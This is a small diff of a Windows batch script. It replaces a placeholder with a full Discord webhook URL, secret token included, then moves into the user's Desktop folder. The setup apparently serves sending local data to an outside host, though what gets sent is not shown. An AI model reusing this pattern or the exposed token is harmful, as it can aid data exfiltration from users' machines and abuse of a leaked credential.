@@ -4,7 +4,7 @@ REM =====================
 @echo off
 setlocal EnableDelayedExpansion
 
-set "WEBHOOK_URL=YOUR_WEBHOOK_URL_HERE"
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1316401544433897482/EwCP2AeMxTMazqM5m4HlzgOpIhQG2lGPX-b5kGAtEKrqom9OaXjyQw1Xiz05yNKtBw5B"
 cd "%USERPROFILE%\Desktop"
 
 REM Create timestamp
